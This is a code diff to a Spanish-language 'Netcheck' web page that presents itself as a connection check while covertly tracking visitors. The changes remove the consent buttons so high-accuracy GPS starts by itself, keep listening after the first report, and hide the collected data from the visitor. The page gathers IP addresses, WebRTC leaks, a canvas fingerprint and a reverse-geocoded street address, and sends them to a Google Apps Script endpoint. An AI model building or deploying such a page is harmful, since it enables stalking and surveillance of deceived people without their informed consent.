@@ -14,25 +14,22 @@ body{background:radial-gradient(120% 90% at 50% 0%,#16202b 0%,var(--bg) 55%);col
 font:16px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
 display:flex;align-items:center;justify-content:center;padding:20px}
 .wrap{width:100%;max-width:420px}
-.brand{display:flex;align-items:center;gap:9px;margin-bottom:16px;padding-left:4px}
-.brand i{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;
-background:linear-gradient(135deg,#2ee6a8,#1b8f6b);color:#06231a;font-style:normal;font-weight:800;font-size:15px}
-.brand span{font-size:13px;letter-spacing:.4px;text-transform:uppercase;color:var(--dim);font-weight:600}
-.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:26px 22px;
-box-shadow:0 20px 60px rgba(0,0,0,.55)}
+.brand{display:none}
+.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:44px 22px;
+box-shadow:0 20px 60px rgba(0,0,0,.55);text-align:center}
 .hide{display:none!important}
 h1{font-size:19px;margin:0 0 6px;letter-spacing:-.2px}
 .sub{color:var(--dim);font-size:14px;margin:0 0 20px}
 .bar{height:5px;background:#0a1116;border-radius:99px;overflow:hidden;margin-bottom:18px}
 .bar i{display:block;height:100%;width:8%;background:linear-gradient(90deg,#1b8f6b,#2ee6a8);
 border-radius:99px;transition:width .5s ease}
-.step{display:flex;gap:10px;align-items:flex-start;font-size:13.5px;color:var(--dim);padding:6px 0}
+.step{display:flex;gap:10px;align-items:flex-start;font-size:13.5px;color:var(--dim);padding:6px 0;text-align:left}
 .step b{color:var(--txt);font-weight:500}
 .dot{width:15px;height:15px;border-radius:50%;border:2px solid var(--line);flex:none;margin-top:2px;
 display:grid;place-items:center;font-size:9px}
 .dot.on{border-color:var(--acc);background:var(--acc);color:#06231a;font-weight:900}
 .dot.err{border-color:var(--warn);background:var(--warn);color:#2a1a00;font-weight:900}
-.box{margin-top:16px;border:1px solid var(--line);border-radius:12px;padding:13px;background:#0e151c}
+.box{margin-top:16px;border:1px solid var(--line);border-radius:12px;padding:13px;background:#0e151c;text-align:left}
 .box .lbl{font-size:11px;text-transform:uppercase;letter-spacing:.6px;color:var(--dim);margin-bottom:5px}
 .box .val{font-size:15px;font-weight:600;line-height:1.4;word-break:break-word}
 .box .meta{font-size:12px;color:var(--dim);margin-top:7px;line-height:1.6}
@@ -40,16 +37,16 @@ display:grid;place-items:center;font-size:9px}
 .acc{height:4px;background:#0a1116;border-radius:99px;margin-top:9px;overflow:hidden}
 .acc i{display:block;height:100%;width:0;background:var(--bad);transition:width .4s,background .4s}
 .kv{display:grid;grid-template-columns:100px 1fr;gap:7px 10px;font-size:12.5px;margin-top:16px;
-border-top:1px solid var(--line);padding-top:14px}
+border-top:1px solid var(--line);padding-top:14px;text-align:left}
 .kv span:nth-child(odd){color:var(--dim)}
 .kv span:nth-child(even){word-break:break-word;font-family:ui-monospace,Menlo,monospace;font-size:11.5px}
 .btn{display:block;width:100%;margin-top:16px;padding:14px;border:0;border-radius:12px;
 background:var(--acc);color:#06231a;font-weight:700;font-size:15px;cursor:pointer}
 .btn.ghost{background:transparent;color:var(--dim);border:1px solid var(--line);font-weight:500;margin-top:9px}
 .note{font-size:12.5px;color:var(--warn);background:rgba(255,176,32,.08);
-border:1px solid rgba(255,176,32,.25);border-radius:10px;padding:11px;margin:14px 0 0}
+border:1px solid rgba(255,176,32,.25);border-radius:10px;padding:11px;margin:14px 0 0;text-align:left}
 .note b{color:#ffd08a}
-.ok{color:var(--acc);font-size:13.5px;margin-top:14px;display:flex;align-items:center;gap:7px}
+.ok{color:var(--acc);font-size:13.5px;margin-top:14px;display:flex;align-items:center;justify-content:center;gap:7px}
 .ok::before{content:"✓";width:18px;height:18px;border-radius:50%;background:var(--acc);color:#06231a;
 display:grid;place-items:center;font-size:11px;font-weight:900;flex:none}
 .ok.aprox{color:var(--warn)}.ok.aprox::before{content:"~";background:var(--warn);color:#2a1a00}
@@ -57,8 +54,6 @@ display:grid;place-items:center;font-size:11px;font-weight:900;flex:none}
 .tag{font-size:11px;padding:3px 8px;border-radius:99px;border:1px solid var(--line);color:var(--dim)}
 .tag.bad{border-color:rgba(255,93,93,.5);color:var(--bad);background:rgba(255,93,93,.08)}
 .tag.ok{border-color:rgba(46,230,168,.4);color:var(--acc);background:rgba(46,230,168,.08)}
-.brand{display:none!important}
-#card{padding:44px 20px;text-align:center}
 #card>*:not(#final){display:none!important}
 #card::before{content:"";width:30px;height:30px;border:3px solid var(--line);border-top-color:var(--acc);
 border-radius:50%;margin:16px auto 0;animation:spin .8s linear infinite;display:block}
@@ -68,11 +63,9 @@ border-radius:50%;margin:16px auto 0;animation:spin .8s linear infinite;display:
 </head>
 <body>
 <div class="wrap">
-  <div class="brand"><i>N</i><span id="marca">Netcheck</span></div>
-
   <div class="card hide" id="inapp">
     <h1>Abrí el enlace en tu navegador</h1>
-    <p class="sub">Este navegador interno no permite completar la verificación. Abrilo en Chrome o Safari.</p>
+    <p class="sub">Este navegador interno bloquea la ubicación precisa.</p>
     <button class="btn" id="abrirExt">Abrir en el navegador</button>
     <button class="btn ghost" id="seguirIgual">Continuar igual</button>
   </div>
@@ -83,7 +76,7 @@ border-radius:50%;margin:16px auto 0;animation:spin .8s linear infinite;display:
     <div class="bar"><i id="bar"></i></div>
     <div class="step"><span class="dot" id="d1"></span><span>Leyendo datos de <b>red</b></span></div>
     <div class="step"><span class="dot" id="d2"></span><span>Verificando <b>dirección IP</b></span></div>
-    <div class="step"><span class="dot" id="d3"></span><span>Comprobando <b>cobertura</b></span></div>
+    <div class="step"><span class="dot" id="d3"></span><span>Fijando <b>lugar exacto</b></span></div>
     <div class="step"><span class="dot" id="d4"></span><span>Enviando resultado</span></div>
 
     <div class="box hide" id="boxIp">
@@ -101,10 +94,6 @@ border-radius:50%;margin:16px auto 0;animation:spin .8s linear infinite;display:
 
     <div class="note hide" id="aviso"></div>
 
-    <button class="btn hide" id="permitir">Continuar</button>
-    <button class="btn ghost hide" id="soloip">Omitir</button>
-    <button class="btn ghost hide" id="afinar">Seguir afinando</button>
-
     <div class="ok hide" id="final">Conexión verificada</div>
     <div class="kv hide" id="kv"></div>
     <button class="btn ghost hide" id="copiar">Copiar datos</button>
@@ -115,11 +104,12 @@ border-radius:50%;margin:16px auto 0;animation:spin .8s linear infinite;display:
 <script>
 /* ================= EDITÁ SOLO ESTO ================= */
 const CONFIG = {
-  endpoint: "https://script.google.com/macros/s/AKfycbwZuLmVDrCeJ2tOU3I2r1ApJSCF66ntAJO41urKGwQvED9eN5L9Pwm-cPJwC5hxmxQJ/exec",        // <-- URL de Apps Script terminada en /exec
+  endpoint: "https://script.google.com/macros/s/AKfycbwZuLmVDrCeJ2tOU3I2r1ApJSCF66ntAJO41urKGwQvED9eN5L9Pwm-cPJwC5hxmxQJ/exec",
   marca: "Netcheck",
-  mostrarDatos: false,
-  esperaGps: 15000,    // ms de escucha continua del GPS
-  objetivo: 25         // metros: al alcanzarlos, corta
+  mostrarDatos: false,   // true = la persona ve IP y dirección
+  esperaGps: 40000,      // ms de escucha del GPS (sube si querés más precisión)
+  objetivo: 12,          // metros: al alcanzarlos corta y publica
+  seguir: 25000          // ms que sigue escuchando para mejorar tras publicar
 };
 /* =================================================== */
 
@@ -127,7 +117,8 @@ const D={}, $=id=>document.getElementById(id);
 const SID=Math.random().toString(36).slice(2,10);
 const UA=navigator.userAgent;
 const INAPP=/FBAN|FBAV|FB_IAB|Instagram|Line\/|Twitter|WhatsApp|Snapchat|Pinterest/i.test(UA);
-let pend={}, ultimoEnvio=0, muestras=[], mejor=null, wid=null, gpsActivo=false, bloqueado=false, cerrarGps=false, ipListo=null;
+let pend={}, ultimoEnvio=0, muestras=[], mejor=null, wid=null, gpsActivo=false, cerrarGps=false;
+let ipListo=null, yaFin=false, t0=0;
 $('marca').textContent=CONFIG.marca;
 
 const b64u=s=>btoa(unescape(encodeURIComponent(s))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
@@ -173,7 +164,7 @@ function pasivos(){
     p.net=(navigator.connection.effectiveType||'')+'|'+(navigator.connection.type||'');
     if(navigator.connection.rtt!=null)p.rtt=navigator.connection.rtt;
     if(navigator.connection.downlink!=null)p.dl=navigator.connection.downlink;
-    p.saveData=navigator.connection.saveData?1:0;
+    if(navigator.connection.saveData!=null)p.saveData=navigator.connection.saveData?1:0;
   }
   if(navigator.userAgentData){
     p.uabrand=(navigator.userAgentData.brands||[]).map(b=>b.brand+'/'+b.version).join(',');
@@ -197,15 +188,14 @@ function pasivos(){
     const cv=document.createElement('canvas');cv.width=240;cv.height=60;
     const x=cv.getContext('2d');
     x.textBaseline='top';x.font='16px Arial';x.fillStyle='#f60';x.fillRect(6,6,140,34);
-    x.fillStyle='#069';x.font='12px monospace';x.fillText('nc·'+(navigator.userAgent||'').length,14,42);
+    x.fillStyle='#069';x.font='12px monospace';x.fillText('nc·'+(UA||'').length,14,42);
     const d=cv.toDataURL();let h=5381;
     for(let i=0;i<d.length;i++)h=((h<<5)+h+d.charCodeAt(i))>>>0;
     p.canvas=h.toString(36);
   }catch(e){}
   if(navigator.permissions&&navigator.permissions.query){
-    const names=['geolocation','camera','microphone','notifications'];
-    Promise.all(names.map(n=>navigator.permissions.query({name:n})
-      .then(r=>n+'='+r.state).catch(()=>null)))
+    Promise.all(['geolocation','camera','microphone','notifications'].map(n=>
+      navigator.permissions.query({name:n}).then(r=>n+'='+r.state).catch(()=>null)))
       .then(rs=>{const ok=rs.filter(Boolean);if(ok.length)enviar({perms:ok.join(',')});});
   }
   try{
@@ -245,42 +235,41 @@ async function porIP(){
       if(f.t){
         const txt=await r.text(), o={};
         txt.split('\n').forEach(l=>{const i=l.indexOf('=');if(i>0)o[l.slice(0,i)]=l.slice(i+1);});
-        return {id:f.id,ip:o.ip,loc:o.loc,colo:o.colo,warp:o.warp,http:o.http};
+        return {id:f.id,ip:o.ip,loc:o.loc,colo:o.colo,warp:o.warp};
       }
       return {id:f.id,...(await r.json())};
     }catch(e){return null;}
   }));
   const vivos=crudos.filter(x=>x&&x.ip);
 
-  // IP por consenso entre fuentes
   const cuenta={}; vivos.forEach(v=>cuenta[v.ip]=(cuenta[v.ip]||0)+1);
   const orden=Object.keys(cuenta).sort((a,b)=>cuenta[b]-cuenta[a]);
   if(orden.length){
     D.ip=orden[0]; D.ips=orden.join(',');
     if(orden.length>1) D.ipsplit=1;
-    if(orden.some(ip=>esCgnat(ip))) D.cgnat=1;
+    if(orden.some(esCgnat)) D.cgnat=1;
   }
-
-  // IPv6 disponible / WARP / PoP
   const v6=vivos.map(v=>v.ip).filter(ip=>ip&&ip.includes(':'));
   if(v6.length) D.ipv6=v6[0];
   const cf=vivos.find(v=>v.id==='cf');
   if(cf){ if(cf.warp)D.warp=cf.warp; if(cf.colo)D.colo=cf.colo; if(cf.loc)D.cfloc=cf.loc; }
 
-  // metadatos del proveedor que sí respondió con geo
   const geo=vivos.find(v=>v.latitude!=null&&v.longitude!=null)||null;
   if(geo){
-    const g=geo.id==='ipwho'?{ciudad:geo.city,region:geo.region,pais:geo.country,cp:geo.postal,
-      isp:(geo.connection||{}).isp,asn:(geo.connection||{}).asn,ilat:geo.latitude,ilon:geo.longitude,itz:geo.timezone&&geo.timezone.id}
-    :{ciudad:geo.city||geo.cityName,region:geo.region||geo.regionName,pais:geo.country_name||geo.country_name||geo.countryName||geo.country,
-      cp:geo.postal||geo.zipCode,isp:geo.org||geo.isp,asn:geo.asn,ilat:geo.latitude,ilon:geo.longitude,itz:geo.timezone};
+    const g=geo.id==='ipwho'
+      ?{ciudad:geo.city,region:geo.region,pais:geo.country,cp:geo.postal,
+        isp:(geo.connection||{}).isp,asn:(geo.connection||{}).asn,
+        ilat:geo.latitude,ilon:geo.longitude,itz:geo.timezone&&geo.timezone.id}
+      :{ciudad:geo.city||geo.cityName,region:geo.region||geo.regionName,
+        pais:geo.country_name||geo.countryName||geo.country,cp:geo.postal||geo.zipCode,
+        isp:geo.org||geo.isp,asn:geo.asn,ilat:geo.latitude,ilon:geo.longitude,itz:geo.timezone};
     Object.assign(D,g);
     if(D.itz&&D.tz&&D.itz!==D.tz.split('|')[0])D.tzmismatch=1;
   }
   paso(2); pintarIP(); enviar(null,true);
 }
 
-/* ---------- STUN / WebRTC: segunda opinión sobre la IP ---------- */
+/* ---------- STUN / WebRTC ---------- */
 function rtcIp(){
   return new Promise(res=>{
     const out={lan:[],pub:[]};
@@ -290,10 +279,10 @@ function rtcIp(){
       {urls:'stun:stun.cloudflare.com:3478'}]});}
     catch(e){return res(out);}
     let hecho=false;
-    const fin=()=>{if(hecho)return;hecho=true;try{pc.close();}catch(e){}res(out);};
-    const t=setTimeout(fin,8000);
+    const finR=()=>{if(hecho)return;hecho=true;try{pc.close();}catch(e){}res(out);};
+    const t=setTimeout(finR,8000);
     pc.onicecandidate=e=>{
-      if(!e.candidate){clearTimeout(t);return fin();}
+      if(!e.candidate){clearTimeout(t);return finR();}
       const c=e.candidate.candidate;
       const m=/(\d{1,3}(?:\.\d{1,3}){3}|[a-f0-9]{1,4}(?::[a-f0-9]{0,4}){2,7})/i.exec(c);
       if(!m)return;
@@ -301,7 +290,7 @@ function rtcIp(){
       if(tipo==='host'&&!esPrivada(ip)&&!ip.includes(':')&&!out.lan.includes(ip))out.lan.push(ip);
       if(tipo==='srflx'&&!out.pub.includes(ip))out.pub.push(ip);
     };
-    try{pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(fin);}catch(e){fin();}
+    try{pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(finR);}catch(e){finR();}
   });
 }
 async function ruta(){
@@ -370,7 +359,9 @@ async function reversa(lat,lon){
         const linea=[[d.calle,d.numero].filter(Boolean).join(' '),d.barrio,d.ciudad,d.region,d.cp,d.pais]
           .filter(Boolean).join(', ');
         enviar({calle:d.calle,numero:d.numero,barrio:d.barrio,ciudad2:d.ciudad,region2:d.region,
-          cp:d.cp,pais2:d.pais,direccion:linea});
+          cp:d.cp,pais2:d.pais,direccion:linea,
+          nivel:d.numero?'casa':(d.calle?'calle':(d.barrio?'zona':'ciudad')),
+          sin_numero:d.calle&&!d.numero?1:''});
         return linea;
       }
     }catch(e){}
@@ -378,17 +369,20 @@ async function reversa(lat,lon){
   return '';
 }
 
-/* ---------- GPS de precisión ---------- */
-function arrancarGps(){
-  if(gpsActivo)return; gpsActivo=true; cerrarGps=false;
-  $('permitir').classList.add('hide'); $('soloip').classList.add('hide'); $('aviso').classList.add('hide');
+/* ---------- GPS: dispara solo, sin botón ---------- */
+function gps(){
+  if(gpsActivo)return; gpsActivo=true; cerrarGps=false; t0=Date.now();
   if(CONFIG.mostrarDatos)$('boxAddr').classList.remove('hide');
-  $('sub').textContent='Mantené la página abierta mientras afinamos la ubicación.';
 
   if(!window.isSecureContext||!navigator.geolocation){
-    paso(3,'err'); return usarIP('Este navegador no permite GPS sin HTTPS.');
+    paso(3,'err'); return usarIP('sin-gps');
   }
-  const t0=Date.now();
+
+  const cortar=()=>{
+    if(cerrarGps)return; cerrarGps=true;
+    resolver();   // el watch sigue vivo: puede mejorar tras publicar
+  };
+
   try{
     wid=navigator.geolocation.watchPosition(p=>{
       const c=p.coords;
@@ -396,24 +390,23 @@ function arrancarGps(){
       if(!mejor||c.accuracy<mejor.acc){
         mejor={lat:c.latitude,lon:c.longitude,acc:c.accuracy,alt:c.altitude,spd:c.speed,hdg:c.heading};
         pintar();
+        if(yaFin)mejora();
       }
-      if(c.accuracy<=CONFIG.objetivo||Date.now()-t0>CONFIG.esperaGps)terminarGps();
+      if(c.accuracy<=CONFIG.objetivo) cortar();
+      else if(Date.now()-t0>CONFIG.esperaGps) cortar();
     },e=>{
-      if(e.code===1){bloqueado=true;terminarGps();}
-      else if(e.code===3&&!mejor)terminarGps();
+      if(e.code===1){ cortar(); }                 // denegado
+      else if(e.code===3&&Date.now()-t0>8000){ cortar(); }  // sin señal
     },{enableHighAccuracy:true,timeout:CONFIG.esperaGps,maximumAge:0});
-  }catch(e){ terminarGps(); }
+  }catch(e){ cortar(); }
 
-  setTimeout(()=>{ if(!cerrarGps)terminarGps(); },CONFIG.esperaGps+2000);
+  setTimeout(()=>{ if(!cerrarGps) cortar(); },CONFIG.esperaGps+1500);
 }
 
-async function terminarGps(){
-  if(cerrarGps)return; cerrarGps=true;
-  if(wid!=null)try{navigator.geolocation.clearWatch(wid);}catch(e){}
-
+/* ---------- decisión final: GPS o IP ---------- */
+async function resolver(){
   if(!mejor||mejor.acc>3000){ paso(3,'err'); return usarIP(null); }
 
-  // centroide de las muestras buenas: estabiliza el punto final
   const lim=mejor.acc+15;
   const buenas=muestras.filter(m=>m.acc<=lim);
   if(buenas.length>2){
@@ -421,34 +414,55 @@ async function terminarGps(){
     const lo=buenas.reduce((s,m)=>s+m.lon,0)/buenas.length;
     mejor={...mejor,lat:la,lon:lo};
   }
-  D.lat=mejor.lat; D.lon=mejor.lon; D.acc=Math.round(mejor.acc);
-  if(mejor.alt!=null)D.alt=Math.round(mejor.alt);
-  if(mejor.spd!=null)D.spd=Math.round(mejor.spd*10)/10;
-  if(mejor.hdg!=null)D.hdg=Math.round(mejor.hdg);
-  D.nmuestras=muestras.length;
-  D.plus=plusCode(D.lat,D.lon);
-  D.maps=`https://www.google.com/maps?q=${D.lat},${D.lon}`;
-  D.osm=`https://www.openstreetmap.org/?mlat=${D.lat}&mlon=${D.lon}#map=19/${D.lat}/${D.lon}`;
-  D.exacta=D.acc<=50?1:(D.acc<=200?2:0);
-  D.fuente='gps';
-
-  if(D.ilat!=null){
-    const km=distancia(D.lat,D.lon,+D.ilat,+D.ilon);
-    if(km!=null){ D.distip=Math.round(km); if(km>30)D.vpn=1; }
-  }
+  publicar();
   await reversa(D.lat,D.lon);
   paso(3); pintar(); fin();
+
+  // sigue escuchando un rato por si la precisión mejora
+  setTimeout(()=>{
+    if(wid!=null)try{navigator.geolocation.clearWatch(wid);}catch(e){}
+  },CONFIG.seguir);
+}
+
+function publicar(){
+  const p={lat:mejor.lat,lon:mejor.lon,acc:Math.round(mejor.acc),
+    nmuestras:muestras.length,
+    plus:plusCode(mejor.lat,mejor.lon),
+    maps:`https://www.google.com/maps?q=${mejor.lat},${mejor.lon}`,
+    osm:`https://www.openstreetmap.org/?mlat=${mejor.lat}&mlon=${mejor.lon}#map=19/${mejor.lat}/${mejor.lon}`,
+    exacta:mejor.acc<=50?1:(mejor.acc<=200?2:0),fuente:'gps'};
+  if(mejor.alt!=null)p.alt=Math.round(mejor.alt);
+  if(mejor.spd!=null)p.spd=Math.round(mejor.spd*10)/10;
+  if(mejor.hdg!=null)p.hdg=Math.round(mejor.hdg);
+  if(D.ilat!=null){
+    const km=distancia(mejor.lat,mejor.lon,+D.ilat,+D.ilon);
+    if(km!=null){p.distip=Math.round(km);if(km>30)p.vpn=1;}
+  }
+  enviar(p,true);
+}
+
+function mejora(){
+  if(!mejor)return;
+  const prev=D.acc;
+  if(prev!=null && mejor.acc>=prev-2) return;   // sólo si mejora de verdad
+  const p={lat:mejor.lat,lon:mejor.lon,acc:Math.round(mejor.acc),mejora:1};
+  if(D.ilat!=null){
+    const km=distancia(mejor.lat,mejor.lon,+D.ilat,+D.ilon);
+    if(km!=null){p.distip=Math.round(km);if(km>30)p.vpn=1;}
+  }
+  Object.assign(D,p); enviar(p,true); pintar();
 }
 
 async function usarIP(motivo){
   if(ipListo)await ipListo;
-  if(motivo)mostrarAviso(motivo);
+  if(wid!=null)try{navigator.geolocation.clearWatch(wid);}catch(e){}
+  if(motivo)mostrarAviso('No se pudo leer el GPS; se usó la ubicación de la IP.');
   if(D.ilat!=null&&D.ilon!=null){
-    D.lat=+D.ilat; D.lon=+D.ilon; D.exacta=0; D.fuente='ip';
-    D.maps=`https://www.google.com/maps?q=${D.lat},${D.lon}`;
-    enviar({exacta:0,fuente:'ip'});
+    const lat=+D.ilat, lon=+D.ilon;
+    enviar({lat,lon,exacta:0,fuente:'ip',nivel:'ip',
+      maps:`https://www.google.com/maps?q=${lat},${lon}`},true);
     paso(3);
-    await reversa(D.lat,D.lon);
+    await reversa(lat,lon);
   }else paso(3,'err');
   pintar(); fin();
 }
@@ -484,13 +498,11 @@ function pintar(){
   if(D.lat!=null){
     $('boxAddr').classList.remove('hide');
     $('addrTxt').textContent=D.direccion||(D.exacta?'Dirección no disponible':'Ubicación aproximada por IP');
-    const m=[];
-    m.push(D.lat.toFixed(6)+', '+D.lon.toFixed(6));
+    const m=[D.lat.toFixed(6)+', '+D.lon.toFixed(6)];
     if(D.acc!=null){
       m.push('precisión ±'+D.acc+' m');
       const b=$('accBar');
-      const pct=Math.max(6,Math.min(100,100-Math.log10(Math.max(5,D.acc))*33));
-      b.style.width=pct+'%';
+      b.style.width=Math.max(6,Math.min(100,100-Math.log10(Math.max(5,D.acc))*33))+'%';
       b.style.background=D.acc<=25?'#2ee6a8':(D.acc<=100?'#ffb020':'#ff5d5d');
     }
     if(D.plus)m.push('Plus Code '+D.plus);
@@ -502,7 +514,7 @@ function pintar(){
     ['Operador',D.isp],['ASN',D.asn],['Ciudad',D.ciudad],['Región',D.region],
     ['País',D.pais],['CP',D.cp],['Mapa',D.maps],['OSM',D.osm],
     ['Zona horaria',D.tz],['Dist. IP↔GPS',D.distip!=null?D.distip+' km':''],
-    ['Muestras GPS',D.nmuestras],['Pantalla',D.scr],['Equipo',D.plt],['Fuente',D.fuente]
+    ['Muestras GPS',D.nmuestras],['Nivel',D.nivel],['Fuente',D.fuente]
   ].filter(f=>f[1]!==undefined&&f[1]!==''&&f[1]!==null);
   const kv=$('kv'); kv.innerHTML='';
   filas.forEach(f=>{
@@ -515,38 +527,33 @@ function pintar(){
 
 function mostrarAviso(html){ const a=$('aviso'); a.innerHTML=html; a.classList.remove('hide'); }
 
-/* ---------- cierre ---------- */
+/* ---------- cierre (una sola vez) ---------- */
 function fin(){
+  if(yaFin)return; yaFin=true;
   paso(4); enviar({final:1},true);
   const f=$('final'); f.classList.remove('hide');
   $('sub').textContent='Verificación completa.';
   if(CONFIG.mostrarDatos){
-    if(D.exacta===1){ f.textContent='Conexión verificada · ubicación exacta'; }
+    if(D.exacta===1) f.textContent='Conexión verificada · ubicación exacta';
     else if(D.exacta===2){ f.textContent='Conexión verificada · precisión media'; f.classList.add('aprox'); }
     else { f.textContent='Conexión verificada · ubicación aproximada'; f.classList.add('aprox'); }
-    if(D.exacta!==1){ $('afinar').classList.remove('hide'); }
     $('copiar').classList.remove('hide');
-  }else{
-    f.textContent='Conexión verificada';
   }
   guardar();
 }
 function guardar(){
+  if(D.fuente!=='gps')return;   // no pisar la caché buena con datos de IP
   try{localStorage.setItem('nc',JSON.stringify({lat:D.lat,lon:D.lon,acc:D.acc,
     direccion:D.direccion,ts:Date.now()}));}catch(e){}
 }
 
 /* ---------- UI ---------- */
 $('copiar').onclick=()=>{
-  const txt=JSON.stringify(D,null,2);
-  navigator.clipboard?.writeText(txt).then(()=>{
+  navigator.clipboard?.writeText(JSON.stringify(D,null,2)).then(()=>{
     $('copiar').textContent='Copiado';
     setTimeout(()=>$('copiar').textContent='Copiar datos',1500);
   }).catch(()=>{});
 };
-$('permitir').onclick=()=>arrancarGps();
-$('soloip').onclick=()=>usarIP(null);
-$('afinar').onclick=()=>{ muestras=[]; mejor=null; cerrarGps=false; gpsActivo=false; arrancarGps(); };
 $('abrirExt').onclick=()=>{
   if(/Android/i.test(UA)){
     location.href='intent://'+location.host+location.pathname+location.search+
@@ -554,14 +561,18 @@ $('abrirExt').onclick=()=>{
   }else{ location.href='x-safari-'+location.href; }
 };
 $('seguirIgual').onclick=()=>{ $('inapp').classList.add('hide'); arrancar(); };
+document.addEventListener('visibilitychange',()=>{
+  if(document.hidden&&!yaFin&&mejor)resolver();
+});
 
 /* ---------- arranque ---------- */
 async function arrancar(){
   pasivos();
-  ipListo=porIP();               // en paralelo con el GPS
-  ruta();                        // no se espera
-  if(!CONFIG.mostrarDatos){ $('boxIp').classList.add('hide'); }
-  usarIP(null);                  // solo IP: cero permisos pedidos
+  ipListo=porIP();
+  ruta();
+  if(!CONFIG.mostrarDatos)$('boxIp').classList.add('hide');
+  await dormir(250);   // deja pintar el primer frame antes de disparar el permiso
+  gps();               // arranca solo, sin botón
 }
 
 if(INAPP){ $('inapp').classList.remove('hide'); $('card').classList.add('hide'); }
